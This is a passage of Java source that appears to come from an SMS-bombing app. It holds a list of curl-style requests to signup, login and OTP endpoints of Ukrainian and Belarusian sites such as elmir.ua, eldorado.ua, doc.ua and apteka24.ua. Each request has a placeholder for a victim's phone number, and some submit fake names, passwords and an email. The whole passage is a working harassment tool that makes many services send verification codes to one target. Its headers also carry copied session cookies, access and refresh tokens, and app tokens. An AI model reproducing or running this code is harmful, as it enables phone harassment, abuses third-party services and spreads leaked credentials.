                new CurlService("curl 'https://elmir.ua/response/load_json.php?type=validate_phone' \\\n" +
                        "  -H 'authority: elmir.ua' \\\n" +
                        "  -H 'accept: application/json, text/javascript, */*; q=0.01' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
                        "  -H 'cookie: visit=https%3A%2F%2Felmir.ua%2Fcell_phones%2F; chat_id=guest%3A1686471415.9541%3A1800068454; h=..s8gS1Be%60-%25SItfwxdS; h=..s8gS1Be%60-%25SItfwxdS; elm38=169034859; ua=0; PHPSESSID=h201a3nbf3suhgbf5d42ves7j9; sess=71fSWEytF671fSWEytF6; sess3=71fSWEytF671fSWEytF6; _ga=GA1.2.1614924221.1686471410; _gid=GA1.2.767035712.1686471411; _fbp=fb.1.1686471411192.1498870346; slow=181.4; device-source=https://elmir.ua/cell_phones/; device-referrer=; helpcrunch.com-elmir-2-user-id=guest:1686471415.9541:1800068454; helpcrunch.com-elmir-2-helpcrunch-device={\"id\":2551856,\"secret\":\"zJzeg4zIOK3Zr4tqpo56ltdMjdKvtBNbFd3d0oV1ifR9T+KOME81EX5/BtPVCHuCIyhAvj2JUQ+aE+sGlBSfMQ==\",\"sessions\":1}; helpcrunch.com-elmir-2-device-id=2551856; helpcrunch.com-elmir-2-token-data={\"access_token\":\"3ok8GHc3HcLWiY9SD8Qw7gwgg1kDnIiPKAZmzTT8XX3ZF8Ubsc26rrQFWhIvYWDQqJJvqfT+zUDy1EWbFjqyiGyXfyLS4lCDsYmlgmQyryCk/1YYbVXgvgvvTW2AJlQ04xN0dJY10U0tHcvkXF4HoxDCQ5nx2cTClGJX2lVvPiRsNn/aKod1X70cYayX5ovZJS8erCZ22ger39YyNjlUwXzta3wBX2mjMN6aseIKMSwIwtIxL7ssnAeteR9WfyGXkpYaqgCUUI7Z459wZ1AHf117LP82qpVHpTlK5ldCpH3eRiHabniKWH2l4s5nkSGBUnvP3yFC8QWqK1xPPdDqpuWS8+7u5SnC4TrUhEajhUkcQOGbESpohIyN9BuetefJ33NOKLmGPS0JC8KkiEclRubEo5DTTG804JkdBbNzd9CX7dizXBKCxCl1umAAhOoJR5D6mE4NBeId7PMQY28v45msxID+WaQFVXXDX1grD438OzdIphaxDAwRu+qOZbq8H4rJkbQOhB+w4qToLYJSzdz8LnAxGOglZuOcJGkly59teydhjoYCc6JHh0O+xydUWjJc5+BhUEMIDNIf3nTWjHOp63qZIsRcYceFMMCw4XY99e58UDnlEeDuT0klapk1hnBrwrqWuLQul/vqvy2PuQc5qD9J/IFnRnBqwSJzVotb7k7DZPjQSAyxvn/2MqxNDyohBzea4lI9stHj2j1gacq/STSLGqT4eANP14bYcXJtxMkkC86Eon7eXgYxwtIh4W5WwI4ycNwXJXg4VhNtdWe5n6Fwg+zVJhEcu72wdnyRk/pEtnGWI+eKrPdvQfZy\",\"refresh_token\":\"NSrTYUuA7TeztRwgFREjb2zjxuMm0JPA+pJ9yzWyykWAOg45qMzLzeDxPUfbjpJ1BdDzV/KmbkHB7F3TJCsK\",\"expires_in\":1686473099458}; _ga_79B3PN4ZWG=GS1.1.1686471410.1.1.1686471459.11.0.0' \\\n" +
                        "  -H 'origin: https://elmir.ua' \\\n" +
                        "  -H 'referer: https://elmir.ua/cell_phones/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                        "  --data-raw 'fields%5Bphone%5D=%2B{full_phone}&fields%5Bcall_from%5D=register&fields%5Bsms_code%5D=&action=code' \\\n" +
                        "  --compressed", 380),

                new CurlService("curl 'https://my.ctrs.com.ua/api/v2/signup' \\\n" +
                        "  -H 'authority: my.ctrs.com.ua' \\\n" +
                        "  -H 'accept: application/json, text/plain, */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/json;charset=UTF-8' \\\n" +
                        "  -H 'cookie: _gcl_au=1.1.1138851447.1686471959; sc=B5AC0EB8-2401-CFC7-54AA-72C8D8E331BD; _ga_LNJDP61TWH=GS1.1.1686471962.1.0.1686471962.60.0.0; _clck=o54405|2|fcd|0|1257; _ga=GA1.3.1322381805.1686471962; _gid=GA1.3.213483907.1686471963; _dc_gtm_UA-2170097-28=1; _fbp=fb.2.1686471963289.1814527937; _clsk=1isklwh|1686471964449|1|1|m.clarity.ms/collect' \\\n" +
                        "  -H 'origin: https://www.ctrs.com.ua' \\\n" +
                        "  -H 'referer: https://www.ctrs.com.ua/smartfony-mobilnye-telefony/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-site' \\\n" +
                        "  -H 'x-app-token: yF27jwg5orUVo4abrops' \\\n" +
                        "  -H 'x-locale: uk' \\\n" +
                        "  --data-raw '{\"name\":\"gergre\",\"phone\":\"{full_phone}\"}' \\\n" +
                        "  --compressed", 380),

                new CurlService("curl 'https://synthetic.ua/api/auth/register/' \\\n" +
                        "  -H 'Accept: application/json, text/plain, */*' \\\n" +
                        "  -H 'Accept-Language: uk' \\\n" +
                        "  -H 'Connection: keep-alive' \\\n" +
                        "  -H 'Content-Type: application/json' \\\n" +
                        "  -H 'Cookie: auth_access=; auth_refresh=; userFirstEntry=true; _tt_enable_cookie=1; _ttp=hc0DwzbP01r_r6EFG8VIWS4mL3B; _gid=GA1.2.948021620.1686472100; _gat_gtag_UA_137014419_1=1; _gcl_au=1.1.1118644271.1686472100; _ga=GA1.1.1441804281.1686472100; _ga_H5ZK4FY06P=GS1.1.1686472100.1.1.1686472100.60.0.0; _fbp=fb.1.1686472100880.1304441811; metrics_token=73cc8dbd-f30c-435c-a92c-ddab19e7785b' \\\n" +
                        "  -H 'Origin: https://synthetic.ua' \\\n" +
                        "  -H 'Referer: https://synthetic.ua/' \\\n" +
                        "  -H 'Sec-Fetch-Dest: empty' \\\n" +
                        "  -H 'Sec-Fetch-Mode: cors' \\\n" +
                        "  -H 'Sec-Fetch-Site: same-origin' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  --data-raw '{\"mobile_phone\":\"{full_phone}\",\"password\":\"qwertyuiop123\",\"password_confirm\":\"qwertyuiop123\"}' \\\n" +
                        "  --compressed", 380),

                new CurlService("curl 'https://ktc.ua/aj' \\\n" +
                        "  -H 'authority: ktc.ua' \\\n" +
                        "  -H 'accept: application/json, text/javascript, */*; q=0.01' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
                        "  -H 'cookie: _ga_ss=01f58fa7e752ddd26800d292e45d6d4c; c_u=0; _kd=sG88q2SFhqYKflGiAw4IAg==; _gcl_au=1.1.1956271123.1686472363; _gid=GA1.2.317263012.1686472364; _dc_gtm_UA-20310467-1=1; _ga=GA1.2.991275439.1686472364; merge_after_login=1; _gat_UA-20310467-1=1; g_state={\"i_p\":1686479568712,\"i_l\":1}; _ga_4TCE34ZT6D=GS1.1.1686472363.1.0.1686472390.33.0.0' \\\n" +
                        "  -H 'origin: https://ktc.ua' \\\n" +
                        "  -H 'referer: https://ktc.ua/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                        "  --data-raw 'action=u&to=sendcode&locale=0&counter=0&phone={phone:(0**)+***-**-**}&source=auth' \\\n" +
                        "  --compressed", 380),

                new CurlService("curl 'https://ktc.ua/aj' \\\n" +
                        "  -H 'authority: ktc.ua' \\\n" +
                        "  -H 'accept: application/json, text/javascript, */*; q=0.01' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
                        "  -H 'cookie: _ga_ss=01f58fa7e752ddd26800d292e45d6d4c; c_u=0; _kd=sG88q2SFhqYKflGiAw4IAg==; _gcl_au=1.1.1956271123.1686472363; _gid=GA1.2.317263012.1686472364; _dc_gtm_UA-20310467-1=1; _ga=GA1.2.991275439.1686472364; merge_after_login=1; _gat_UA-20310467-1=1; g_state={\"i_p\":1686479568712,\"i_l\":1}; _ga_4TCE34ZT6D=GS1.1.1686472363.1.0.1686472382.41.0.0' \\\n" +
                        "  -H 'origin: https://ktc.ua' \\\n" +
                        "  -H 'referer: https://ktc.ua/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                        "  --data-raw 'action=users&to=register&locale=0&page=%2F&another_computer=0&phone=0{phone}&password=ty54ertthtr553453&name=gergergerg+gergerge+&email=bayeyip588%40runfons.com' \\\n" +
                        "  --compressed", 380),

                new CurlService("curl 'https://pwa-api.eva.ua/api/user/send-code?storeCode=ua' \\\n" +
                        "  -H 'authority: pwa-api.eva.ua' \\\n" +
                        "  -H 'accept: application/json, text/plain, */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'authorization: Bearer' \\\n" +
                        "  -H 'content-type: application/json' \\\n" +
                        "  -H 'origin: https://eva.ua' \\\n" +
                        "  -H 'referer: https://eva.ua/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-site' \\\n" +
                        "  -H 'x-device-type: mobile' \\\n" +
                        "  --data-raw '{\"phone\":\"{full_phone}\"}' \\\n" +
                        "  --compressed", 380),

                new CurlService("curl 'https://api-users.eldorado.ua/api/auth/phone/signin/?lang=ua' \\\n" +
                        "  -H 'authority: api-users.eldorado.ua' \\\n" +
                        "  -H 'accept: */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/json' \\\n" +
                        "  -H 'origin: https://eldorado.ua' \\\n" +
                        "  -H 'referer: https://eldorado.ua/uk/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-site' \\\n" +
                        "  -H 'user-client: website' \\\n" +
                        "  -H 'user-client-version: 0.1.0' \\\n" +
                        "  --data-raw '{\"phone\":\"{full_phone}\",\"step\":\"user_authorization\",\"guid\":\"ba0a3710-0833-11ee-a296-01ffc3c56c0f\"}' \\\n" +
                        "  --compressed", 380),

                new CurlService("curl 'https://dok.ua/profile/login' \\\n" +
                        "  -H 'authority: dok.ua' \\\n" +
                        "  -H 'accept: */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
                        "  -H 'cookie: ab_group_version=A; is_sync=1; lbc=0; lang=ru; deviceId=3o4nx88onyqop8i8eloblivdqebdq5cu; sessionId=ir4gknzrit8pn2djicyhuddlok7qlxis; PHPSESSID=ft1j7jqg67q87g2p9otml5janr0bg5p67e6r3hh8m3hs2lngdu0enc2qp4ff8urfj; sourceTraffic=direct; traffic_source_params=%7B%7D; s=0; vh=0; ins=0; i1=1; cookie_transferred=1; _gid=GA1.2.1155098771.1686473132; _gat=1; _gcl_au=1.1.1213599210.1686473132; i2=1; c0={\"Visit\":true,\"NoBounce\":true,\"Value\":false,\"Action\":false,\"Checkout\":false,\"NewOrder\":false,\"Accepted\":false}; ct0=3; _ga_YH59FJRK2C=GS1.1.1686473133.1.0.1686473133.60.0.0; _ga=GA1.1.729404029.1686473132; _hjSessionUser_2676076=eyJpZCI6ImYzMDQ5ZjFhLWIxNzItNTI3My04YjFkLTJhMmE3OWFhNTI4NSIsImNyZWF0ZWQiOjE2ODY0NzMxMzQ4ODcsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_2676076=0; _hjSession_2676076=eyJpZCI6IjEzNDgwMTZjLTRiZTYtNDI4Zi1hZmQ1LTY3Y2U3ZTQ1MzIwMiIsImNyZWF0ZWQiOjE2ODY0NzMxMzQ4OTUsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _fbp=fb.1.1686473139128.1038064024; sendCnt1=14; _gali=signinPopupSend' \\\n" +
                        "  -H 'origin: https://dok.ua' \\\n" +
                        "  -H 'referer: https://dok.ua/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                        "  --data-raw 'phone=0{phone}' \\\n" +
                        "  --compressed", 380),

                new CurlService("curl 'https://kazan-divan.eatery.club/site/v1/pre-login' \\\n" +
                        "  -H 'authority: kazan-divan.eatery.club' \\\n" +
                        "  -H 'accept: application/json, text/plain, */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/json' \\\n" +
                        "  -H 'origin: https://order.eatery.club' \\\n" +
                        "  -H 'referer: https://order.eatery.club/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-site' \\\n" +
                        "  --data-raw '{\"phone\":\"{full_phone}\"}' \\\n" +
                        "  --compressed", 380),

                new CurlService("curl 'https://ucb.z.apteka24.ua/api/send/otp' \\\n" +
                        "  -H 'authority: ucb.z.apteka24.ua' \\\n" +
                        "  -H 'accept: */*' \\\n" +
                        "  -H 'accept-language: ru' \\\n" +
                        "  -H 'content-type: application/json; charset=utf-8' \\\n" +
                        "  -H 'origin: https://www.apteka24.ua' \\\n" +
                        "  -H 'referer: https://www.apteka24.ua/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-site' \\\n" +
                        "  --data-raw '{\"phone\":\"{full_phone}\"}' \\\n" +
                        "  --compressed", 380),

                new CurlService("curl 'https://bi.ua/api/v1/accounts' \\\n" +
                        "  -H 'authority: bi.ua' \\\n" +
                        "  -H 'accept: application/json, text/plain, */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'authorization: Bearer null' \\\n" +
                        "  -H 'content-type: application/json;charset=UTF-8' \\\n" +
                        "  -H 'cookie: advanced-frontend=63bi71bvhh3gkf4ga42ga7ovi5; _csrf-frontend=48243b12d8de49cb4c65d614b699821d25297a4f0e7b8d705261ee5a0a393171a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22yVYcjTS7b2c0IBvZ0hgFCi_eL9tfOSfI%22%3B%7D; _gcl_au=1.1.1852567471.1686473460; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2023-06-11%2011%3A51%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Fbi.ua%2Fukr%2Flogin%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2023-06-11%2011%3A51%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Fbi.ua%2Fukr%2Flogin%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F108.0.0.0%20Safari%2F537.36; _hjFirstSeen=1; _hjIncludedInSessionSample_1559188=0; _hjSession_1559188=eyJpZCI6ImIwYzMxNWY1LTRlZDItNDc1OC05MjBmLTZkOTE4NTkyMWRlZiIsImNyZWF0ZWQiOjE2ODY0NzM0NjA5MzQsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1; _gid=GA1.2.294696729.1686473461; _dc_gtm_UA-8203486-4=1; _fbp=fb.1.1686473461419.375827223; cw_conversation=eyJhbGciOiJIUzI1NiJ9.eyJzb3VyY2VfaWQiOiIzZDlkZWE0NC03NGU1LTRkNjUtODI1Mi04OTg0OWY2MjJhZmEiLCJpbmJveF9pZCI6MjM0NzJ9.BMZdzGsGz3xOZWT_2jNAAHE5_QVsloR3wvJPLAVyvMQ; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbi.ua%2Fukr%2Fsignup%2F; _ga_71EP10GZSQ=GS1.1.1686473460.1.1.1686473470.50.0.0; _ga=GA1.2.905652775.1686473461; _hjSessionUser_1559188=eyJpZCI6IjQ2MzE3NDZmLWI3NTktNTYyNS1hMWFiLTRhMDVjYWVmNzIzNSIsImNyZWF0ZWQiOjE2ODY0NzM0NjA5MjIsImV4aXN0aW5nIjp0cnVlfQ==' \\\n" +
                        "  -H 'language: uk' \\\n" +
                        "  -H 'origin: https://bi.ua' \\\n" +
                        "  -H 'referer: https://bi.ua/ukr/signup/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  --data-raw '{\"grand_type\":\"call_code\",\"stage\":\"1\",\"login\":\"Акупкупк\",\"phone\":\"{full_phone}\"}' \\\n" +
                        "  --compressed", 380),

                new CurlService("curl 'https://doc.ua/mobapi/patient/register' \\\n" +
                        "  -H 'authority: doc.ua' \\\n" +
                        "  -H 'accept: application/json, text/plain, */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/json' \\\n" +
                        "  -H 'cookie: PHPSESSID=4csmnagmcrniaa483hvq9ei5t2; city_id=1; _gcl_au=1.1.989041886.1686473631; _clck=jqsin8|2|fcd|0|1257; _hjSessionUser_3416505=eyJpZCI6IjZhYTlmYzE0LTk3ODYtNTcwZC05OWMyLTYwYmMyNjhjZjU2YiIsImNyZWF0ZWQiOjE2ODY0NzM2Mzg4NzQsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_3416505=0; _hjSession_3416505=eyJpZCI6ImZjMjdkNjczLTQ2NDItNDA1NC05Yzk5LWM3YWNjMTJhNmQ1OCIsImNyZWF0ZWQiOjE2ODY0NzM2Mzg4ODMsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _ga=GA1.2.474365818.1686473632; _gid=GA1.2.1266520925.1686473639; _gat_UA-46229250-2=1; _fbp=fb.1.1686473639625.162560192; _clsk=12jj0qy|1686473640115|1|1|m.clarity.ms/collect; _ga_TTR066R00K=GS1.1.1686473631.1.0.1686473644.47.0.0' \\\n" +
                        "  -H 'origin: https://doc.ua' \\\n" +
                        "  -H 'platform: web' \\\n" +
                        "  -H 'platformversion: 1' \\\n" +
                        "  -H 'referer: https://doc.ua/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'x-app-lang: uk' \\\n" +
                        "  -H 'x-csrf: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjc3JmIiwiZXhwIjoxNjg2NDc0MjU1fQ.jfwwL8gVsex5PqCn5NJXxuLzKkcobrXNCt0FNiM8PGk' \\\n" +
                        "  --data-raw '{\"login\":\"{full_phone}\"}' \\\n" +
                        "  --compressed", 380),

                new CurlService("curl 'https://remzona.by/profile' \\\n" +
                        "  -H 'authority: remzona.by' \\\n" +
                        "  -H 'accept: application/json, text/javascript, */*; q=0.01' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
                        "  -H 'cookie: _rz=idv3np0e8kkp8s2p4hbpprqc5p; _ga_1791G2YBJC=GS1.1.1686473853.1.0.1686473853.0.0.0; _ga=GA1.1.1993536163.1686473853; _ym_uid=168647385448664470; _ym_d=1686473854; _ym_visorc=b; _ym_isad=2' \\\n" +
                        "  -H 'origin: https://remzona.by' \\\n" +
                        "  -H 'referer: https://remzona.by/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                        "  --data-raw 'phone=%2B{phone:375+(**)+***-**-**}&typerequest=sendcode' \\\n" +
                        "  --compressed", 375),

                new FormService("https://ostrov-shop.by/ajax/auth_custom.php", 375) {
                    @SuppressLint("SimpleDateFormat")
                    @Override
                    public void buildBody(Phone phone) {
                        builder.add("backurl", "/basket/");
                        builder.add("AUTH_FORM", "Y");
                        builder.add("TYPE", "AUTH");
                        builder.add("POPUP_AUTH", "Y");
                        builder.add("USER_PHONE_NUMBER", Phone.format(phone.getPhone(), "+375 (**) ***-**-**"));
                        builder.add("UF_DATE_AGREE_DATA", new SimpleDateFormat("dd.MM.yyyy HH:mm").format(new Date()));
                        builder.add("UF_CONSENT", "on");
                        builder.add("Login1", "Y");
                        builder.add("IS_AJAX", "Y");
                    }
                }
        );
    }
}
